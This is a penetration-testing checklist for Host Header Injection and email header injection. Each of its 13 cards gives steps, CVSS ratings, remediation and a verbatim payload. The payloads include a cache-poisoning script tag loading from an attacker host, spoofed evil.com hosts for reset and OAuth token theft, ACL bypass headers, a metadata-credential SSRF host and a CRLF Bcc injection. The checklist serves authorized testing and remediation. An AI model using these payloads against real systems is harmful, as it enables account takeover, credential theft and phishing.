# Host Header Injection — Checklist

Expert per-attack **test-case matrix** for Host Header Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*13 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## HHI-001 — Find host-dependent sinks
**Test Category:** Recon · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** reset/verify links, absolute redirects/canonical/og, cacheable pages, vhost routing, SSO callbacks

**Test Steps:** 1. Find host-dependent sinks: password-reset/verify links, absolute redirects/canonical/og tags, cacheable pages, vhost routing, SSO callbacks.<br>2. Note which pages sit behind a cache/CDN (X-Cache/Age/Cache-Control).<br>3. Note multi-tenant / Host-based routing.

**Expected Result:** A list of sinks where a controllable host reaches a reset/cache/routing/redirect/HTML sink.

**Payload Example:**

```
reset link built from Host ; cached / (Age header) ; OAuth callback from Host
```

**Impact:** The impact is only in the sink; a reflected header without one is worthless.

**Tools:** Burp, curl -I

**References:** CWE-644; OWASP Testing Guide: Testing for Host Header Injection

---

## HHI-002 — Baseline — is the host reflected/used?
**Test Category:** Baseline · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Host and X-Forwarded-Host headers

**Test Steps:** 1. Set Host: evil.com -&gt; accepted or rejected? reflected anywhere (body/Location/links)?<br>2. Set X-Forwarded-Host: evil.com (valid Host) -&gt; reflected/used? (often yes when Host is validated).<br>3. Classify: controllable host reaching a reset link / cache / routing / redirect / HTML sink.

**Expected Result:** The header the app trusts, and where the host lands, are identified.

**Payload Example:**

```
Host: evil.com -> in reset email ; X-Forwarded-Host: evil.com -> in Location
```

**Impact:** X-Forwarded-Host trusted behind a CDN even when Host is validated is the universal bypass.

**Tools:** curl, Burp

**References:** CWE-644; PortSwigger Web Security Academy: HTTP Host header attacks

---

## HHI-003 — Spoofing header set + validation bypass
**Test Category:** Inject / Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Host validation layer

**Test Steps:** 1. Full spoofing set: Host, X-Forwarded-Host, X-Host, X-Forwarded-Server, Forwarded, absolute URI in request line, duplicate Host.<br>2. Bypass: duplicate Host (front-end validates one, backend uses the other), port/userinfo (target.com:@evil.com), line-wrap, weak allowlist (target.com.evil.com, trailing dot, case), SNI-vs-Host mismatch.<br>3. Locate where the host lands.

**Expected Result:** A spoofed host survives validation and reaches a sink.

**Payload Example:**

```
duplicate Host: target.com / Host: evil.com ; Host: target.com:@evil.com ; XFH: evil.com
```

**Impact:** Bypassing Host validation is the prerequisite for every downstream sink.

**Tools:** Burp Repeater

**References:** CWE-644; HackTricks: Host header injection

---

## HHI-004 — Related forwarding headers (X-Original-URL / X-Forwarded-For)
**Test Category:** Inject / Bypass · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** X-Forwarded-Scheme/Proto/Port, X-Original-URL/X-Rewrite-URL, X-Forwarded-For/True-Client-IP

**Test Steps:** 1. X-Forwarded-Scheme/Proto: http -&gt; downgrade links/redirects (chain cache/open-redirect).<br>2. X-Original-URL/X-Rewrite-URL: /admin -&gt; override the PATH after the proxy's ACL check -&gt; reach /admin (auth bypass).<br>3. X-Forwarded-For/True-Client-IP: 127.0.0.1 -&gt; IP-allowlist / rate-limit bypass.

**Expected Result:** A forwarding header bypasses an ACL/IP gate or downgrades a link.

**Payload Example:**

```
X-Original-URL: /admin (ACL bypass) ; X-Forwarded-For: 127.0.0.1 (IP gate) ; X-Forwarded-Proto: http
```

**Impact:** Path-override ACL bypass to /admin / IP-gate bypass - High.

**Tools:** Burp Repeater

**References:** CWE-644; CWE-285; HackTricks: Host header injection

---

## HHI-005 — Password-reset poisoning -&gt; ATO
**Test Category:** Impact — Reset Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** The forgot-password flow (own account)

**Test Steps:** 1. Trigger a reset for YOUR OWN account with a spoofed host (Host / X-Forwarded-Host: evil.com).<br>2. Read your email - if the link is https://evil.com/reset?token=... -&gt; poisoning confirmed.<br>3. Strongest variant: a server-side token CALLBACK to the host (no victim click) -&gt; silent ATO.

**Expected Result:** The reset link/token is built with the attacker host and the token reaches you.

**Payload Example:**

```
POST /forgot {email:you} + X-Forwarded-Host: evil.com -> link points to evil.com
```

**Impact:** Account takeover via reset poisoning - High (Critical if no click).

**Tools:** Burp, own inbox

**References:** CWE-644; CWE-640; PortSwigger Web Security Academy: HTTP Host header attacks

---

## HHI-006 — Web cache poisoning (unkeyed host header)
**Test Category:** Impact — Cache Poisoning · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Reflected host on a cacheable, unkeyed response

**Test Steps:** 1. GET /?cb=UNIQUE + X-Forwarded-Host: evil.com -&gt; reflected AND cacheable (Age/X-Cache:hit)?<br>2. Confirm the header is UNKEYED (Param Miner) - served to others.<br>3. Poison (benign, own key): X-Forwarded-Host: a."&gt;&lt;script src=//$ATTACKER/x.js&gt;&lt;/script&gt;; or a mass-redirect via cached absolute links.

**Expected Result:** The poisoned host payload is served from a shared cache to other users.

**Payload Example:**

```
GET /?cb=UNIQUE + X-Forwarded-Host: a."><script src=//$ATTACKER/x.js></script> -> cached
```

**Impact:** Mass stored XSS / mass redirect via poisoned cache - High/Critical.

**Tools:** Burp Param Miner

**References:** CWE-644; CWE-79; CWE-524; James Kettle: Practical Web Cache Poisoning / Cracking the lens

---

## HHI-007 — Web Cache Deception (read a victim's cached private page)
**Test Category:** Impact — Cache Deception · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Authenticated pages behind a cache that keys by extension

**Test Steps:** 1. Append a static-looking suffix to an authenticated page: /account/info/x.css , ;x.css , %2Fx.css.<br>2. The origin ignores the suffix (returns the private page); the cache stores it by *.css regardless of auth.<br>3. Test on YOUR OWN account: cached (Age/X-Cache:hit) AND readable without your cookie (incognito).

**Expected Result:** A victim's private page is cached at a URL an unauthenticated attacker can read.

**Payload Example:**

```
GET /account/info/nonexistent.css -> private page cached + readable unauthenticated
```

**Impact:** Any user's private data leaks via their cached page - High/Critical.

**Tools:** Burp, incognito

**References:** CWE-644; CWE-525; PortSwigger Web Security Academy: HTTP Host header attacks

---

## HHI-008 — Routing-based SSRF -&gt; metadata / RCE chain
**Test Category:** Impact — Routing SSRF · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Host-based backend routing

**Test Steps:** 1. Host: 169.254.169.254 / localhost / internal-vhost / &lt;id&gt;.oast.pro -&gt; different internal content or an OOB hit from the front-end.<br>2. Cloud metadata -&gt; IAM creds (read-only) -&gt; cloud takeover.<br>3. Chain: routing-SSRF -&gt; internal-admin/Redis -&gt; shell.

**Expected Result:** A spoofed host routes to an internal service / metadata / your OOB.

**Payload Example:**

```
Host: 169.254.169.254 -> IAM creds ; Host: <id>.oast.pro -> OOB hit from front-end
```

**Impact:** SSRF -&gt; cloud metadata creds / internal reach -&gt; RCE - Critical.

**Tools:** SSRFmap, interactsh

**References:** CWE-644; CWE-918; James Kettle: Practical Web Cache Poisoning / Cracking the lens

---

## HHI-009 — Reflected-host XSS / SSO callback poisoning
**Test Category:** Impact — XSS / SSO · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Host echoed unencoded; OAuth callback/redirect_uri built from host

**Test Steps:** 1. Reflected-host XSS: Host: evil.com"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; (stored XSS if the page is cached).<br>2. SSO/OAuth: Host: evil.com when redirect_uri/callback is built from the host -&gt; auth code/token delivered to evil.com -&gt; ATO.<br>3. Absolute redirect built from host -&gt; open redirect.

**Expected Result:** The host reflects to XSS, or the OAuth token/redirect is delivered to the attacker host.

**Payload Example:**

```
Host: evil.com"><script>alert(document.domain)</script> ; OAuth callback -> evil.com gets the code
```

**Impact:** Reflected/stored XSS or OAuth token theft -&gt; ATO - High.

**Tools:** Burp, JWT/CORS kits

**References:** CWE-644; CWE-79; CWE-601; HackTricks: Host header injection

---

## HHI-010 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: 'Host header is reflected' with no security sink; X-Forwarded-Host merely ACCEPTED with no observable effect; changing Host returns 400/canonical redirect (defending correctly) and no bypass reaches a sink; reset link uses a FIXED configured domain (not host-derived); 'cache poisoning' with no proof of caching (Age/X-Cache) or that the header is unkeyed; self-only Host change affecting only your own response.<br>2. REQUIRE: a proven sink impact (poisoned email / cached payload / internal reach).

**Expected Result:** Only candidates with a proven sink impact survive.

**Payload Example:**

```
reflected host + no sink = Info ; accepted XFH + no effect = not a finding ; no Age/X-Cache = unproven
```

**Impact:** Protects credibility; Host-header is dense with reflected-header-without-sink false positives.

**Tools:** manual

**References:** CWE-644; PortSwigger Web Security Academy: HTTP Host header attacks

---

## HHI-011 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest-impact sink (ATO / mass XSS / SSRF).<br>2. Provide the spoofed request and the sink proof (poisoned reset email / cached payload with Age/X-Cache / OOB hit / metadata creds).<br>3. Set CVSS 3.1 + CWE-644 (+640/79/918 by outcome). Remediation: never build absolute URLs / reset links from the Host header (use a fixed configured domain), validate Host against an allowlist and don't trust X-Forwarded-Host, key caches on host, disable X-Original-URL path override.<br>4. Own accounts, benign markers on a NON-shared cache key, own OOB, read-only metadata; de-dupe, confirm on production.

**Expected Result:** A reproducible, correctly-rated PoC with sink proof and clear remediation.

**Payload Example:**

```
PoC: spoofed request + sink proof (reset email / cached payload / OOB) + CVSS + CWE-644 + remediation.
```

**Impact:** Converts the sink impact into a defensible High/Critical report.

**Tools:** CVSS calculator, HOST_HEADER_REPORT_TEMPLATE.md

**References:** CWE-644; CWE-640; FIRST CVSS v3.1; OWASP Testing Guide: Testing for Host Header Injection  |  TOP REFERENCES: James Kettle 'Practical Web Cache Poisoning' + 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy Host header; Burp Param Miner

---

## HHI-012 — SMTP / email header (CRLF) injection via email fields
**Test Category:** Email Header Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** User input placed into outbound email headers (To/From/Subject/Reply-To)

**Test Steps:** 1. Find a field feeding an outbound email (contact/invite/reset/feedback)<br>2. Inject CRLF to add headers (Bcc/Cc) or an extra body/SMTP command<br>3. Confirm you can add recipients or alter the message<br>4. Escalate to email spoofing / spam relay

**Expected Result:** Email fields reject CR/LF; headers built from server-side templates only

**Payload Example:**

```
name=Foo%0d%0aBcc:attacker@x.com   |   subject=Hi%0d%0a%0d%0aInjected body
```

**Impact:** Email/SMTP header injection -&gt; BCC exfiltration, spoofed mail, spam relay

**Tools:** Burp

**References:** CWE-93; CWE-147; OWASP Testing for SMTP/IMAP Injection; PayloadsAllTheThings (CRLF Injection)

---

## HHI-013 — HTML / link injection in transactional emails
**Test Category:** Email Header Injection · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** User input rendered into HTML emails (name/message/order fields)

**Test Steps:** 1. Inject HTML/links into a field rendered inside a transactional email<br>2. Check whether &lt;a&gt;/&lt;img&gt; render in the recipient's client<br>3. Craft a phishing link/spoofed content inside a trusted, branded email<br>4. Confirm it renders in the email client

**Expected Result:** Email templates escape user input; links sanitized/allowlisted

**Payload Example:**

```
message=<a href=https://evil.example>Click</a>   rendered in the outbound email
```

**Impact:** HTML/link injection in a trusted email -&gt; high-credibility phishing using the target's branding

**Tools:** Burp, email client

**References:** CWE-79; CWE-93; OWASP email injection; PayloadsAllTheThings

---
